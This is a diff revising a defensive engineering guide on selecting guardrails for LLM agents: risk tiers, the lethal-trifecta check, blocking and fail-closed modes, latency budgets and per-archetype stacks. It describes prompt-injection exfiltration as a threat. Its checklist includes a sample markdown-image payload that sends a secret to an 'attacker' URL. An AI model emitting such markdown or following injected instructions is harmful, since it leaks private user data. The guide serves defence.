@@ -1,49 +1,52 @@
 # Guardrail Selection Decision Tree
 
-> **TL;DR** — Pick guardrails from risk, not from a vendor feature list: assess who the users are, what data the agent can see, what actions it can take, and whether untrusted content enters its context. If an agent combines private data, untrusted content, and an exfiltration path (the "lethal trifecta"), no classifier will make it safe — remove a leg or add a deterministic control. Then decide per guardrail: blocking or not, sync or async, fail-open or fail-closed, and how much latency it may spend.
+> **TL;DR**
+> - **Select guardrails from risk, not vendor checklists.** Score your users, data sensitivity, action reversibility, and untrusted content exposure first.
+> - **Break the lethal trifecta by design.** Never combine private data, untrusted content, and external communication without deterministic controls or human approval.
+> - **Enforce security in deterministic code.** Keep authorization, tool allowlists, SQL policies, and network egress outside the LLM prompt.
+> - **Configure runtime behavior explicitly.** Set blocking mode, sync vs async execution, fail-open vs fail-closed rules, and latency budgets per guardrail.
 
-**You'll learn:** a risk-assessment questionnaire · the lethal-trifecta / Rule-of-Two check · risk tiers → required guardrails · how to decide blocking vs non-blocking, sync vs async, fail-open vs fail-closed · latency budget allocation · build vs buy · per-archetype guardrail stacks
-· **Prerequisites:** [Guardrails architecture](../04-guardrails/01-guardrails-architecture.md), [Threat model & OWASP](../04-guardrails/07-threat-model-owasp.md)
-· **Related:** [Eval selection](./01-eval-selection-decision-tree.md), [Input guardrails](../04-guardrails/02-input-guardrails.md), [Tool & action guardrails](../04-guardrails/05-tool-and-action-guardrails.md), [Access control & RBAC](../04-guardrails/06-access-control-rbac.md), [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)
+**You will learn:** How to score agent risk · How to run the lethal-trifecta check · Required guardrails by risk tier · How to choose blocking, sync, and fail-closed modes  
+**Prerequisites:** [Guardrails architecture](../04-guardrails/01-guardrails-architecture.md), [Threat model & OWASP](../04-guardrails/07-threat-model-owasp.md)  
+**Related:** [Eval selection](./01-eval-selection-decision-tree.md), [Input guardrails](../04-guardrails/02-input-guardrails.md), [Tool & action guardrails](../04-guardrails/05-tool-and-action-guardrails.md), [Access control & RBAC](../04-guardrails/06-access-control-rbac.md), [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)
 
 ---
 
 ## 1. Principles before trees
 
-1. **Guardrails are controls; evals are measurements.** A guardrail changes what happens at runtime (block, redact, require approval). An eval tells you how often things go wrong. You need evals *of* your guardrails (false-positive and false-negative rates) — see [§9](#9-measuring-guardrails-false-positives-matter).
-2. **Deterministic controls beat probabilistic ones for anything security-critical.** Authorization, allowed tools, SQL read-only enforcement, and egress restrictions belong in code and infrastructure, not in a prompt or a classifier.
-3. **The LLM is not an authorization layer.** "The system prompt tells it not to show salaries to non-HR users" is not access control. Filter data *before* it reaches the model, using the end user's identity. See [Access control & RBAC](../04-guardrails/06-access-control-rbac.md).
-4. **Defense in depth.** Layer input, context, tool, and output controls; assume each layer leaks.
-5. **Design the architecture to reduce what guardrails must catch.** Removing a capability (no outbound HTTP tool) is stronger than detecting misuse of it.
-6. **Every guardrail has a cost:** latency, money, and false positives that degrade UX. Add them based on risk, measure them, and remove ones that don't pay their way.
+1. **Use guardrails to control runtime behavior and evaluations to measure quality.** A guardrail blocks, redacts, or escalates a request at runtime. An evaluation measures how often failures occur. You also must evaluate your guardrails for false positives and false negatives (see [§9](#9-measuring-guardrails-false-positives-matter)).
+2. **Use deterministic code for all security-critical controls.** Enforce authorization, tool allowlists, SQL policies, and network egress in code or infrastructure, never in prompts.
+3. **Never use the LLM as an authorization layer.** Telling a system prompt "do not show salaries to non-HR users" does not secure your data. Filter records using the end user's identity *before* data reaches the model. See [Access control & RBAC](../04-guardrails/06-access-control-rbac.md).
+4. **Layer your defenses.** Combine input, context, tool, and output controls, and assume each individual layer can fail.
+5. **Remove unnecessary capabilities by design.** Removing an outbound HTTP tool protects your system better than trying to detect malicious requests.
+6. **Measure the cost of every guardrail.** Every guardrail adds latency, compute cost, and false positives. Add guardrails based on risk, measure their recall and false-positive rate, and remove ineffective checks.
 
 ---
 
 ## 2. Risk assessment questionnaire
 
-Answer these for each agent (or each capability, if the agent's capabilities differ a lot in risk). Score each row; the scores feed the tier in §4.
+Score these eight questions for your agent (or for each distinct capability). Use the resulting score to assign your risk tier in §4.
 
 | # | Question | Low (0) | Medium (1) | High (2) |
 |---|---|---|---|---|
 | R1 | **Who are the users?** | Small set of trusted internal staff, authenticated | All employees / authenticated customers | Public, anonymous, or untrusted |
-| R2 | **What data can the agent access?** | Public or non-sensitive docs | Internal confidential | PII, PHI, financial, HR, credentials, regulated data; or data with per-user entitlements |
-| R3 | **Can the agent take actions?** | Read-only, no side effects | Reversible writes (draft ticket, internal note) | Irreversible / external effects (send email, payments, delete, deploy, modify records) |
+| R2 | **What data can the agent access?** | Public or non-sensitive docs | Internal confidential | PII, PHI, financial, HR, credentials, regulated data, or per-user entitled data |
+| R3 | **Can the agent take actions?** | Read-only, no side effects | Reversible writes (draft ticket, internal note) | Irreversible or external effects (send email, payments, delete, deploy, modify records) |
 | R4 | **Does untrusted content enter the context?** | Only curated, internally authored content | Internal content editable by many employees | Web pages, emails, user uploads, third-party APIs, tickets from customers |
-| R5 | **Can output leave the trust boundary?** | Output shown only to the requesting user | Output stored/shared internally | Agent can make HTTP requests, render external images/links, send messages, write to external systems |
-| R6 | **Regulatory / domain exposure?** | None | Contractual, brand-sensitive | Regulated (finance, health, legal, employment decisions, children), or EU AI Act high-risk-type use |
-| R7 | **Blast radius of one bad output?** | One user, easily noticed and ignored | Many users or decisions made on it | Financial loss, safety, legal liability, data breach, mass action |
-| R8 | **Autonomy?** | Human reviews every output before use | Human reviews sometimes | Fully autonomous loops, no human in the loop |
+| R5 | **Can output leave the trust boundary?** | Output shown only to the requesting user | Output stored/shared internally | Agent can make HTTP requests, render external images/links, send messages, or write externally |
+| R6 | **Regulatory / domain exposure?** | None | Contractual, brand-sensitive | Regulated (finance, health, legal, employment decisions, children) or EU AI Act high-risk use |
+| R7 | **Blast radius of one bad output?** | One user, easily noticed and ignored | Many users or decisions made on it | Financial loss, safety harm, legal liability, data breach, or mass action |
+| R8 | **Autonomy?** | Human reviews every output before use | Human reviews sometimes | Fully autonomous loops with no human in the loop |
 
-**Scoring heuristic:** any single **High (2)** on R2, R3, R5, or R7 → at least **Tier 2**. Two or more Highs, or a lethal-trifecta hit (§3) → **Tier 3**. Otherwise sum: 0–4 → Tier 1, 5–9 → Tier 2, 10+ → Tier 3. These thresholds are a starting point for discussion, not a standard; adjust them with your security team.
+**How to score:** Assign at least **Tier 2** if any single answer on R2, R3, R5, or R7 scores **High (2)**. Assign **Tier 3** if you have two or more High scores, or if your agent hits the lethal trifecta (§3). Otherwise sum your points: `0–4` = Tier 1, `5–9` = Tier 2, and `10+` = Tier 3. Review these thresholds with your security team.
 
-**Running example:** internal enterprise assistant.
-R1 = 1 (all employees), R2 = 2 (HR/finance tables), R3 = 1 (create ticket — reversible), R4 = 1 (wiki editable by any employee), R5 = 1 (tickets visible to support teams; renders markdown), R6 = 1–2 (HR data → employment), R7 = 1, R8 = 1. → **Tier 2–3**: treat HR/finance paths as Tier 3.
+**Running example:** Consider our internal enterprise assistant. It scores 1 on R1 (employees), R3 (reversible tickets), R4 (editable wiki), R5 (shared tickets/markdown), R7, and R8. It scores 2 on R2 (HR/finance tables) and 1–2 on R6 (HR employment data). Treat the overall system as **Tier 2** and isolate the HR/finance paths as **Tier 3**.
 
 ---
 
 ## 3. The lethal-trifecta check
 
-Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/): an agent that has **(1) access to private data**, **(2) exposure to untrusted content**, and **(3) the ability to communicate externally** can be tricked by injected instructions into exfiltrating that data. Meta's [Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) generalizes this: within a session, an agent should satisfy **no more than two** of: [A] processes untrustworthy inputs, [B] has access to sensitive systems or private data, [C] can change state or communicate externally — or else require human-in-the-loop supervision.
+Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) warns against combining **(1) private data access**, **(2) untrusted content exposure**, and **(3) external communication**. An attacker can use prompt injection to hijack any agent with all three legs and exfiltrate private data. Meta's [Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) generalizes this rule. Within a single session, an agent must satisfy **at most two** of these three properties unless a human approves every action.
 
 ```mermaid
 flowchart TD
@@ -61,18 +64,18 @@ flowchart TD
     F3 --> D
 ```
 
-Why classifiers alone are not enough: prompt-injection detectors are probabilistic, and an attacker only needs one miss. Treat them as a speed bump and a telemetry source, not the wall. For architectural patterns see Willison's [Dual LLM pattern](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/), [Design Patterns for Securing LLM Agents against Prompt Injections (arXiv:2506.08837)](https://arxiv.org/abs/2506.08837), and [Defeating Prompt Injections by Design (CaMeL, arXiv:2503.18813)](https://arxiv.org/abs/2503.18813).
+Do not rely on classifiers alone to stop the lethal trifecta. Prompt-injection classifiers are probabilistic, and an attacker needs only one bypass to steal data. Use classifiers as telemetry and defense in depth after you fix the architecture. For secure design patterns, see Willison's [Dual LLM pattern](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/), [Beurer-Kellner et al. (arXiv:2506.08837)](https://arxiv.org/abs/2506.08837), and [CaMeL (arXiv:2503.18813)](https://arxiv.org/abs/2503.18813).
 
-**Common hidden exfiltration paths** (check every one):
+**Audit your system for these six hidden exfiltration paths:**
 
-- [ ] Markdown image rendering in the chat UI (`![x](https://attacker/?q=SECRET)`) — the client fetches the URL.
-- [ ] Clickable links with data in query strings.
-- [ ] Tools that fetch URLs, call webhooks, or send email/Slack messages.
-- [ ] Writing to shared systems (tickets, wiki pages, CRM notes) that others — or other agents — later read.
-- [ ] Code execution sandboxes with network access.
-- [ ] Logging/analytics pipelines that ship raw outputs to third parties.
+- [ ] Block or proxy markdown image rendering (`![x](https://attacker/?q=SECRET)`) so the browser cannot leak data via URL fetches.
+- [ ] Strip or sanitize clickable links that embed sensitive data in query parameters.
+- [ ] Restrict tools that fetch URLs, trigger webhooks, or send email and chat messages.
+- [ ] Gate writes to shared systems (tickets, wikis, CRM notes) that other users or agents read.
+- [ ] Disable outbound network access inside code execution sandboxes by default.
+- [ ] Scrub sensitive fields before shipping logs or analytics to third-party services.
 
-**Running example:** private data (HR/finance) ✔, untrusted content (employee-editable wiki, ticket text) ✔, exfil path (ticket creation visible to others; markdown rendering) ✔ → trifecta present. Mitigations chosen: disable external image rendering and non-allowlisted links in UI; ticket tool restricted to fixed fields with no free-form external recipients; HR/finance SQL path runs without retrieving wiki content in the same turn (removes leg [A] for the sensitive path); prompt-injection classifier on retrieved chunks as defense in depth.
+**Running example:** Our enterprise assistant reads private HR/finance data, ingests employee-editable wiki pages, and creates shared tickets while rendering markdown. To break the trifecta, we disable external markdown images and restrict links to an allowlist. We also lock ticket creation to fixed schema fields and block wiki retrieval during HR/finance SQL runs.
 
 ---
 
@@ -104,7 +107,7 @@ Why classifiers alone are not enough: prompt-injection detectors are probabilist
 | **Red teaming before launch** | Light self-test | Structured red-team pass | Structured + independent red team, repeated per major change | [Threat model](../04-guardrails/07-threat-model-owasp.md) |
 | **Kill switch / feature flag per capability** | Recommended | Required | Required, tested | [Guardrails architecture](../04-guardrails/01-guardrails-architecture.md) |
 
-Map each guardrail to the [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) risk it addresses in your threat model ([threat model doc](../04-guardrails/07-threat-model-owasp.md)), so that gaps are visible.
+Map each guardrail to its [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) risk in your [threat model](../04-guardrails/07-threat-model-owasp.md) to expose gaps.
 
 ---
 
@@ -126,13 +129,13 @@ flowchart TD
 
 | Action type | What happens | Use for |
 |---|---|---|
-| **Hard block** | Request/response rejected; safe message returned | Authz violations, disallowed tools, unsafe SQL, secrets in output, clear policy violations |
-| **Modify / redact** | Content transformed and allowed | PII redaction, stripping external links/images, truncating oversized input |
-| **Escalate / confirm** | Pause for human or user confirmation | Irreversible actions, low-precision but high-stakes detections |
-| **Flag (non-blocking)** | Allowed; logged with a label, alert if rate spikes | Injection-detector hits on internal docs, low-confidence toxicity, groundedness scores |
-| **Shadow mode** | Runs silently, no effect | **Every new blocking guardrail should start here** to measure false positives before enforcement |
+| **Hard block** | Rejects the request or response and returns a safe fallback message | Authorization violations, disallowed tools, unsafe SQL, leaked secrets, and clear policy violations |
+| **Modify / redact** | Transforms the content and allows the response to proceed | Redacting PII, stripping external links or images, and truncating oversized inputs |
+| **Escalate / confirm** | Pauses execution until a human or end user confirms | Irreversible actions and high-stakes detections where classifier precision is moderate |
+| **Flag (non-blocking)** | Allows the response, logs a warning label, and alerts on rate spikes | Injection-detector hits on internal docs, low-confidence toxicity, and groundedness scores |
+| **Shadow mode** | Runs the check silently without changing runtime behavior | **Testing every new blocking guardrail** to measure false positives on live traffic before enforcement |
 
-**Rule:** a new blocking guardrail goes **shadow → flag → block**, with measured precision at each step.
+**Follow this rollout rule:** Promote every new blocking guardrail through **shadow → flag → block**, and verify precision at each stage.
 
 ---
 
@@ -140,9 +143,9 @@ flowchart TD
 
 | | Synchronous (in the request path) | Asynchronous (after response / in parallel) |
 |---|---|---|
-| Latency impact | Adds to user-perceived latency | None (or near none) |
-| Can prevent harm | Yes | No — only detect, alert, remediate |
-| Use for | Blocking controls: authz, tool validation, SQL policy, PII/secret output scan, injection checks before tool calls | Quality monitoring: groundedness, tone, relevance, drift; expensive judges; analytics |
+| Latency impact | Adds directly to user-perceived latency | Adds zero user-facing latency |
+| Can prevent harm | Yes | No (detects, alerts, and triggers follow-up remediation only) |
+| Use for | Blocking controls: authz, tool validation, SQL policy, PII/secret output scan, and pre-tool injection checks | Quality monitoring: groundedness, tone, relevance, drift, expensive LLM judges, and analytics |
 
 ```mermaid
 flowchart LR
@@ -153,24 +156,24 @@ flowchart LR
     P -- No --> SS["Sequential sync: keep it fast, cheap, deterministic where possible"]
 ```
 
-**Latency tricks for sync checks:**
+**Use these four techniques to reduce synchronous latency:**
 
-- Run input checks **in parallel** with retrieval or the first LLM call; abort if the check fails before you return anything.
-- With **streaming**, you can't un-send tokens. Options: buffer the first N tokens/sentences and check, check per chunk with a rolling window, or reserve streaming for low-risk intents.
-- Gate **tool calls**, not just final output: the moment of highest risk in an agent is when it executes an action, and the check there is usually cheap and deterministic.
-- Prefer small classifiers / regex / parsers over LLM calls in the hot path.
+- Run input classifiers **in parallel** with retrieval or the initial LLM call, and abort the response if a check fails.
+- Buffer the first $N$ tokens or sentences when **streaming**, or disable token streaming on high-risk intents because you cannot un-send streamed tokens.
+- Gate **tool calls** right before execution using fast, deterministic schema and policy checks.
+- Use regexes, parsers, and small classifiers instead of LLM judges in the synchronous hot path.
 
 ---
 
 ## 7. Decision: fail-open vs fail-closed
 
-When the guardrail itself errors or times out, what happens?
+Decide how each guardrail behaves when the check itself throws an error or times out.
 
 | | Fail-closed (deny on error) | Fail-open (allow on error) |
 |---|---|---|
-| Choose when | The guardrail protects against data leakage, unauthorized action, regulatory breach | The guardrail protects quality/brand only, and blocking would cause a large outage |
-| Examples | Authz check, SQL policy check, tool-approval service, output secret scan on Tier 3 | Tone classifier, topic classifier on internal Tier 1 tool, async groundedness |
-| Mitigation for the downside | Clear "temporarily unavailable" messaging; health checks; capacity planning | Alert on guardrail error rate; log every fail-open event; time-box |
+| Choose when | The guardrail prevents data leaks, unauthorized actions, or regulatory breaches | The guardrail checks quality or brand tone, and blocking would cause an unnecessary outage |
+| Examples | Authorization check, SQL policy check, tool-approval service, and Tier 3 output secret scans | Tone classifier, topic classifier on an internal Tier 1 tool, and async groundedness checks |
+| Mitigation for the downside | Return a clear "temporarily unavailable" message and monitor service health | Alert on guardrail error rates, log every fail-open event, and enforce a strict timeout |
 
 ```mermaid
 flowchart TD
@@ -180,40 +183,40 @@ flowchart TD
     B -- No --> FO["Fail-open with alerting and logging"]
 ```
 
-**Anti-pattern:** the default timeout handler in many SDK wrappers returns "allowed". Check how your guardrail client behaves on timeout and make it an explicit, reviewed decision.
+**Avoid accidental fail-open defaults:** Many guardrail SDKs return "allowed" when a timeout occurs. Inspect your client timeout handling and test failure behavior explicitly.
 
 ---
 
 ## 8. Latency budget allocation
 
-Set a total p95 latency target for the user interaction, then allocate. A worked heuristic for a chat assistant targeting a ~3–5 s p95 for first meaningful output (your numbers will differ):
+Set an overall p95 latency target for your user interaction and allocate a budget to each layer. Here is a starting allocation for a chat assistant targeting a 3–5 second p95 time to first response:
 
 | Stage | Guardrails here | Suggested budget (heuristic) | Technique |
 |---|---|---|---|
-| Pre-request | AuthN/Z, rate limit, input size | ≤ 50 ms | Deterministic, in-process |
-| Input checks | Injection/jailbreak classifier, PII detection, topic | ≤ 100–300 ms | Small classifiers; run parallel with retrieval |
-| Retrieval / context | ACL filter (in the query), injection scan on chunks | ≤ 100–200 ms extra | Pre-compute scans at indexing time where content is static |
-| Tool call gate | Allowlist, schema, SQL parser policy, approval check | ≤ 50 ms (excluding human approval) | Deterministic |
-| Output checks | Schema, PII/secret scan, link sanitization, toxicity | ≤ 100–300 ms | Regex/parsers + small classifier; LLM-judge only for high-stakes intents |
-| Async | Groundedness, relevance, policy judges, analytics | 0 ms user-facing | Queue + sample |
+| Pre-request | AuthN/Z, rate limit, input size | ≤ 50 ms | Run deterministic checks in-process |
+| Input checks | Injection/jailbreak classifier, PII detection, topic | ≤ 100–300 ms | Use small classifiers and run in parallel with retrieval |
+| Retrieval / context | ACL filter (in the query), injection scan on chunks | ≤ 100–200 ms extra | Pre-compute injection scans at indexing time for static docs |
+| Tool call gate | Allowlist, schema, SQL parser policy, approval check | ≤ 50 ms (excluding human approval) | Use deterministic code checks |
+| Output checks | Schema, PII/secret scan, link sanitization, toxicity | ≤ 100–300 ms | Use regex, parsers, and small classifiers, and reserve LLM judges for high-stakes intents |
+| Async | Groundedness, relevance, policy judges, analytics | 0 ms user-facing | Run asynchronously via background queues on sampled traffic |
 
-**Tip:** scan static content (your document corpus) **at indexing time** and store a flag; only scan dynamic content (web pages, emails, tool outputs) at query time.
+**Optimization tip:** Scan static documents for prompt injections **at indexing time** and store the flag in metadata. Scan only dynamic content (web pages, emails, live tool outputs) at query time.
 
 ---
 
 ## 9. Measuring guardrails: false positives matter
 
-Every guardrail is a binary classifier and must be evaluated like one.
+Treat every guardrail as a binary classifier and measure its performance offline and online.
 
 | Metric | Definition | Why it matters |
 |---|---|---|
-| Recall (catch rate) | blocked attacks / total attacks | Security effectiveness |
-| False-positive rate | blocked benign / total benign | UX cost; high FPR leads teams to disable the guardrail |
-| Precision | true blocks / all blocks | Trust in alerts |
-| Latency p50/p95 | added time | Budget compliance |
-| Error / timeout rate | guardrail failures | Interacts with fail-open/closed |
+| Recall (catch rate) | `blocked attacks / total attacks` | Measures security effectiveness |
+| False-positive rate | `blocked benign / total benign` | Measures UX friction because high false-positive rates cause teams to disable guardrails |
+| Precision | `true blocks / all blocks` | Measures alert trustworthiness |
+| Latency p50/p95 | Added wall-clock time | Verifies compliance with your latency budget |
+| Error / timeout rate | Guardrail execution failures | Triggers fail-open or fail-closed fallback paths |
 
-Build two datasets per guardrail: **benign-but-tricky** (legitimate queries that look suspicious — e.g. an employee asking "how do I reset someone's password" in an IT helpdesk) and **adversarial**. See [Generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md) and [Threat model](../04-guardrails/07-threat-model-owasp.md).
+Maintain two evaluation datasets for every guardrail: an **adversarial set** and a **benign-but-tricky set**. Include legitimate queries that look suspicious, such as "how do I reset a user password?" in an IT helpdesk bot. See [Generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md) and [Threat model](../04-guardrails/07-threat-model-owasp.md).
 
 ```python
 def guardrail_report(results):
@@ -235,88 +238,88 @@ def guardrail_report(results):
 
 | Guardrail type | Default | Rationale |
 |---|---|---|
-| AuthN/AuthZ, RBAC, row/doc-level security | **Build** on your existing IAM/data platform | Must reflect your entitlement model; LLM vendors can't know it |
-| Tool allowlist, schema validation, SQL policy | **Build** (with standard libs: JSON Schema, Pydantic, a SQL parser) | Simple, deterministic, app-specific |
-| Rate limiting, quotas, egress control | **Reuse** API gateway / infra | Already exists in most orgs |
-| PII detection | **Buy or OSS** (e.g. Microsoft Presidio), then tune | Hard to build well; needs locale coverage |
-| Toxicity / harmful content | **Buy or OSS** (provider moderation endpoints, open safety classifiers) | Commodity; evaluate on your data |
-| Prompt-injection detection | **Buy or OSS**, treat as defense in depth | Fast-moving threat; vendors update models |
-| Groundedness / hallucination | **OSS or build** with LLM judge, calibrated on your data | Domain-specific; needs your references |
-| Orchestration framework for rails | **OSS** (e.g. NeMo Guardrails, Guardrails AI) or your own middleware | Choose on fit with your stack and observability |
+| AuthN/AuthZ, RBAC, row/doc-level security | **Build** on your existing IAM and data platform | Must match your internal entitlement model, which external vendors do not know |
+| Tool allowlist, schema validation, SQL policy | **Build** with standard libraries (JSON Schema, Pydantic, SQLGlot) | Simple, deterministic, and tightly coupled to your application |
+| Rate limiting, quotas, egress control | **Reuse** your API gateway and cloud infrastructure | Already available in standard platform infrastructure |
+| PII detection | **Buy or use OSS** (such as Microsoft Presidio), then tune | Hard to build from scratch and requires broad locale coverage |
+| Toxicity / harmful content | **Buy or use OSS** (moderation APIs or open safety classifiers) | Commodity capability that you should benchmark on your own domain data |
+| Prompt-injection detection | **Buy or use OSS** as defense in depth | Fast-moving threat where dedicated maintainers update detection models |
+| Groundedness / hallucination | **Use OSS or build** an LLM judge calibrated on your data | Domain-specific and requires alignment against your own reference labels |
+| Orchestration framework for rails | **Use OSS** (NeMo Guardrails, Guardrails AI) or custom middleware | Choose based on integration fit with your application and tracing stack |
 
-Questions to ask any vendor (or OSS project):
+Check these six criteria before adopting any vendor or open-source guardrail:
 
-- [ ] Can I measure FPR/recall on **my** data before enforcing? Shadow mode?
-- [ ] Latency p95 at my expected QPS? Self-hostable?
-- [ ] Where does my data go? Retention? Compliance attestations?
-- [ ] Behaviour on timeout/error — configurable fail-open/closed?
-- [ ] Custom policies/categories? Multilingual?
-- [ ] How are detections explained/logged for audit?
+- [ ] Verify that you can run the guardrail in shadow mode and measure recall and false-positive rate on your own data.
+- [ ] Measure p95 latency at your target query volume and confirm whether you can self-host the model.
+- [ ] Confirm data routing, retention policies, and compliance certifications.
+- [ ] Check whether timeout and error handling support explicit fail-open and fail-closed configuration.
+- [ ] Verify support for custom policy categories and your required languages.
+- [ ] Check whether blocked requests return clear explanations and structured audit logs.
 
-See [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md) for the landscape.
+See [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md) for a comparison of available tools.
 
 ---
 
 ## 11. Per-archetype recommended guardrail stack
 
-Archetypes match [eval selection §2](./01-eval-selection-decision-tree.md#2-the-five-input-questions). "B" = blocking, "NB" = non-blocking; "S" = sync, "A" = async.
+These archetypes match [eval selection §2](./01-eval-selection-decision-tree.md#2-the-five-input-questions). In the tables below, `B` = blocking, `NB` = non-blocking, `S` = synchronous, and `A` = asynchronous.
 
 ### 11.1 A1 — Simple RAG chatbot
 
 | Layer | Guardrail | Mode |
 |---|---|---|
-| Input | Size limits, rate limit; topic/scope classifier (if external) | B/S |
-| Input | Injection/jailbreak detection | NB/S → B for public apps |
-| Retrieval | ACL-filtered retrieval if docs have entitlements | B/S |
-| Retrieval | Indexing-time scan of corpus for injected instructions (if many authors) | NB, offline |
-| Output | Link/image sanitization; PII/secret scan | B/S |
-| Output | Toxicity | B/S for public, NB/A internal |
+| Input | Size limits, rate limits, and topic/scope classifier (if external) | B/S |
+| Input | Injection and jailbreak detection | NB/S → B for public apps |
+| Retrieval | ACL-filtered retrieval when documents have access restrictions | B/S |
+| Retrieval | Indexing-time corpus scan for injected instructions (when many authors contribute) | NB, offline |
+| Output | Link/image sanitization and PII/secret scanning | B/S |
+| Output | Toxicity filter | B/S for public, NB/A for internal |
 | Output | Groundedness judge | NB/A |
 
 ### 11.2 A2 — Agentic RAG with tools
 
 | Layer | Guardrail | Mode |
 |---|---|---|
-| Identity | User identity propagated to every tool call; tools execute with user-scoped credentials | B/S |
-| Tools | Allowlist per role; JSON-schema argument validation; parameter constraints (e.g. ticket priority enum) | B/S |
-| Tools | Human/user confirmation for irreversible or external actions | B/S |
-| Tools | Max steps, max tool calls, per-tool rate limits, budget caps | B/S |
-| Context | Treat tool outputs and retrieved docs as untrusted data; injection scanning; provenance tags | NB → B on high-risk paths |
-| Architecture | Lethal-trifecta check; isolate untrusted-content processing from action selection | Design |
-| Output | As A1 + scan for data that the user's role shouldn't see (secondary check, not primary authz) | B/S |
-| Audit | Log every tool call with args, result status, approver | A |
+| Identity | Propagate user identity to every tool call and execute with user-scoped credentials | B/S |
+| Tools | Enforce per-role allowlists, JSON-schema validation, and enum/range constraints | B/S |
+| Tools | Require human or user confirmation for irreversible or external actions | B/S |
+| Tools | Enforce max steps, max tool calls, per-tool rate limits, and budget caps | B/S |
+| Context | Treat tool outputs and retrieved chunks as untrusted data, scan for injections, and tag provenance | NB → B on high-risk paths |
+| Architecture | Run the lethal-trifecta check and isolate untrusted content from action selection | Design |
+| Output | Apply all A1 checks plus secondary role-based output scanning | B/S |
+| Audit | Log every tool call with arguments, result status, and approver identity | A |
 
 ### 11.3 A3 — Text-to-SQL agent
 
 | Layer | Guardrail | Mode |
 |---|---|---|
-| DB | Read-only DB role; database-enforced row-level security / views keyed on end-user identity | B (infra) |
-| SQL | Parse generated SQL; allow only `SELECT`; block multiple statements, DDL/DML, system catalogs, disallowed schemas | B/S |
-| SQL | Query cost limits: `LIMIT` injection, timeouts, max rows scanned | B/S |
-| Input | Detect raw SQL / injection-style payloads in user input and treat as a signal (flag or route), not as primary protection | NB/S |
-| Output | Aggregation thresholds / small-cell suppression if privacy-sensitive | B/S |
-| Output | Number-consistency check (answer numbers appear in result) | NB/A or B for high-stakes |
-| Audit | Log SQL, user, role, rows returned | A |
+| DB | Enforce a read-only DB role and row-level security views keyed on end-user identity | B (infra) |
+| SQL | Parse generated SQL to allow only `SELECT` and block multi-statement, DDL/DML, system catalog, or cross-schema queries | B/S |
+| SQL | Enforce query cost limits via `LIMIT` injection, timeouts, and max rows scanned | B/S |
+| Input | Flag raw SQL or injection payloads in user input as telemetry alongside parser enforcement | NB/S |
+| Output | Apply aggregation thresholds and small-cell suppression on privacy-sensitive tables | B/S |
+| Output | Verify that numbers in the narrative answer match the SQL result set | NB/A or B for high-stakes |
+| Audit | Log generated SQL, user identity, role, and row count returned | A |
 
 ### 11.4 A4 — Multi-agent / multi-step
 
 | Layer | Guardrail | Mode |
 |---|---|---|
-| All A2 controls per sub-agent | — | — |
-| Orchestration | Global step/time/cost budget; loop detection; termination conditions | B/S |
-| Hand-offs | Sub-agents get least privilege; don't pass full privileges/credentials across hand-offs | B (design) |
-| Hand-offs | Inter-agent messages treated as untrusted when any upstream agent read untrusted content | B/NB |
-| Memory | Write validation on shared memory/state; provenance on memory entries | B/S |
-| Kill switch | Per-agent and global | B |
+| All A2 controls per sub-agent | Apply A2 identity, tool, context, and output controls to each sub-agent | B/S |
+| Orchestration | Enforce global step, time, and cost budgets alongside loop detection | B/S |
+| Hand-offs | Scope each sub-agent to least privilege and never pass broad credentials across hand-offs | B (design) |
+| Hand-offs | Treat inter-agent messages as untrusted whenever an upstream agent reads untrusted content | B/NB |
+| Memory | Validate writes to shared memory and attach provenance tags to stored entries | B/S |
+| Kill switch | Provide both per-agent and global kill switches | B |
 
 ### 11.5 A5 — Multi-turn conversational
 
 | Layer | Guardrail | Mode |
 |---|---|---|
-| Session | Re-check authz each turn (roles can change; don't cache permission decisions across long sessions) | B/S |
-| Session | Conversation-level jailbreak detection (gradual escalation across turns) | NB/S → B |
-| Memory | PII retention policy for stored conversation history | B (policy) |
-| Output | All A1–A3 output checks per turn | as above |
+| Session | Re-verify user authorization on every turn rather than caching permissions across long sessions | B/S |
+| Session | Run conversation-level jailbreak detection to catch multi-turn escalation attacks | NB/S → B |
+| Memory | Enforce PII scrubbing and retention limits on stored conversation history | B (policy) |
+| Output | Apply all A1–A3 output checks on every turn | B/S |
 
 ### 11.6 Running example — final guardrail stack
 
@@ -331,7 +334,7 @@ Archetypes match [eval selection §2](./01-eval-selection-decision-tree.md#2-the
 | SQL | Read-only role, RLS views per user, parser allowlist, timeout, row cap | Code/Infra | B/S | Closed |
 | Ticket tool | Fixed schema, enum fields, user-confirmation step, no external recipients | Code + UX | B/S | Closed |
 | Output | Strip external images/links, PII/secret regex + NER | Code + Clf | B/S | Closed |
-| Output | Groundedness judge on 10% sample; 100% for HR policy intents (async) | Judge | NB/A | Open |
+| Output | Groundedness judge on 10% sample and 100% of HR policy intents (async) | Judge | NB/A | Open |
 | Audit | Full trace with role, chunk IDs, SQL, tool calls | Code | A | — |
 
 ---
@@ -366,13 +369,13 @@ flowchart TD
 
 ## Key takeaways
 
-- Start from a risk questionnaire (users, data, actions, untrusted content, exfil paths, regulation, blast radius, autonomy), not a list of products.
-- If private data + untrusted content + an exfiltration path coexist, fix the architecture; classifiers are defense in depth only.
-- Authorization, tool allowlists, and SQL policy are deterministic code and infrastructure — never delegated to the LLM.
-- Block only what you can detect precisely or what is irreversible; everything else flags, escalates, or runs async. Promote guardrails shadow → flag → block.
-- Fail-closed for confidentiality, authz, and irreversible actions; fail-open (with alerts) for quality/brand checks.
-- Allocate a latency budget per layer; push static-content scanning to indexing time; gate tool calls, not only final text.
-- Measure every guardrail's recall and false-positive rate on your own data.
+- Score your system with the risk questionnaire (users, data, actions, untrusted content, exfiltration paths, regulation, blast radius, autonomy) before picking guardrails.
+- Redesign your architecture if private data, untrusted content, and external communication coexist. Classifiers provide defense in depth only.
